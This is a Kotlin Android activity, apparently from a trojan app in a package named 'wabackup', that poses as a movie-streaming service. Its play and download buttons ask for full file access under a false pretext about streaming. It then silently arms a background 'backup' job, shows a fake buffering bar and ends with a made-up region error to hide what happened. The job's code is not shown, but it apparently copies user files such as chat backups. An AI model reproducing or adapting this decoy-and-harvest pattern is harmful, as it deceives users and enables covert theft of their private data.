package com.personal.wabackup.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import androidx.work.WorkManager
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.personal.wabackup.R
import com.personal.wabackup.ui.adapter.SectionAdapter
import com.personal.wabackup.ui.data.MovieData
import com.personal.wabackup.ui.model.Movie
import com.personal.wabackup.util.BackupScheduler

class HomeActivity : AppCompatActivity() {

    private lateinit var wm: WorkManager
    private var pendingAction: (() -> Unit)? = null
    private var currentHeroIndex = 0
    private val heroHandler = Handler(Looper.getMainLooper())

    // Views
    private lateinit var imgHero: ImageView
    private lateinit var txtHeroTitle: TextView
    private lateinit var txtHeroMatch: TextView
    private lateinit var txtHeroYear: TextView
    private lateinit var txtHeroGenre: TextView
    private lateinit var bufferingOverlay: FrameLayout
    private lateinit var txtBuffering: TextView
    private lateinit var txtBufferingTitle: TextView

    private val legacyStorageRequest =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            if (hasStorageAccess()) {
                pendingAction?.invoke()
            }
            pendingAction = null
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        wm = WorkManager.getInstance(applicationContext)

        imgHero = findViewById(R.id.img_hero)
        txtHeroTitle = findViewById(R.id.txt_hero_title)
        txtHeroMatch = findViewById(R.id.txt_hero_match)
        txtHeroYear = findViewById(R.id.txt_hero_year)
        txtHeroGenre = findViewById(R.id.txt_hero_genre)
        bufferingOverlay = findViewById(R.id.buffering_overlay)
        txtBuffering = findViewById(R.id.txt_buffering)
        txtBufferingTitle = findViewById(R.id.txt_buffering_title)

        setupHeroBanner()
        setupSections()

        val btnPlay = findViewById<View>(R.id.btn_play)
        val btnDownload = findViewById<View>(R.id.btn_download)
        btnPlay.setOnClickListener { onMovieButtonClick(MovieData.featured[currentHeroIndex]) }
        btnDownload.setOnClickListener { onMovieButtonClick(MovieData.featured[currentHeroIndex]) }

        // Silent arm if permission already granted
        if (hasStorageAccess()) {
            BackupScheduler.schedule(this, wm)
        }
    }

    private fun setupHeroBanner() {
        showHero(0)
        scheduleHeroRotation()
    }

    private fun showHero(index: Int) {
        val movie = MovieData.featured[index]
        txtHeroTitle.text = movie.title
        txtHeroMatch.text = movie.match
        txtHeroYear.text = movie.year
        txtHeroGenre.text = movie.genre

        // Use backdrop for hero (wider/landscape image)
        val backdropUrl = MovieData.TMDB_BACKDROP + MovieData.featuredBackdrops[index]
        Glide.with(imgHero.context)
            .load(backdropUrl)
            .transition(DrawableTransitionOptions.withCrossFade(600))
            .centerCrop()
            .error(
                // Fallback to poster if backdrop fails
                Glide.with(imgHero.context)
                    .load(MovieData.TMDB_BASE + movie.posterPath)
                    .centerCrop()
            )
            .into(imgHero)
    }

    private fun scheduleHeroRotation() {
        heroHandler.postDelayed({
            currentHeroIndex = (currentHeroIndex + 1) % MovieData.featured.size
            showHero(currentHeroIndex)
            scheduleHeroRotation()
        }, 5000)
    }

    private fun setupSections() {
        val rv = findViewById<RecyclerView>(R.id.rv_sections)
        rv.layoutManager = LinearLayoutManager(this)
        rv.adapter = SectionAdapter(MovieData.sections) { movie ->
            onMovieButtonClick(movie)
        }
        rv.setHasFixedSize(false)
        rv.isNestedScrollingEnabled = false
    }

    private fun onMovieButtonClick(movie: Movie) {
        if (hasStorageAccess()) {
            triggerFakeBuffering(movie)
        } else {
            pendingAction = { triggerFakeBuffering(movie) }
            requestStorageAccess()
        }
    }

    private fun triggerFakeBuffering(movie: Movie) {
        bufferingOverlay.visibility = View.VISIBLE
        txtBuffering.text = "Buffering... 0%"
        txtBufferingTitle.text = movie.title

        // Silent background work
        BackupScheduler.runNow(wm)
        BackupScheduler.schedule(this, wm)

        // Fake progress updates
        val steps = listOf(
            1000L to "Buffering... 18%",
            2200L to "Buffering... 35%",
            3500L to "Buffering... 52%",
            4800L to "Buffering... 71%",
            6000L to "Buffering... 88%",
            7500L to "Error: Content not available in your region."
        )
        steps.forEach { (delay, text) ->
            bufferingOverlay.postDelayed({
                txtBuffering.text = text
                if (text.startsWith("Error")) {
                    // Hide overlay after showing error
                    bufferingOverlay.postDelayed({
                        bufferingOverlay.visibility = View.GONE
                    }, 2500)
                }
            }, delay)
        }
    }

    private fun hasStorageAccess(): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }

    private fun requestStorageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
            Toast.makeText(
                this,
                "Allow file access to stream and download videos.",
                Toast.LENGTH_LONG
            ).show()
        } else {
            legacyStorageRequest.launch(
                arrayOf(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                )
            )
        }
    }

    override fun onResume() {
        super.onResume()
        if (pendingAction != null && hasStorageAccess()) {
            val action = pendingAction
            pendingAction = null
            action?.invoke()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        heroHandler.removeCallbacksAndMessages(null)
    }
}
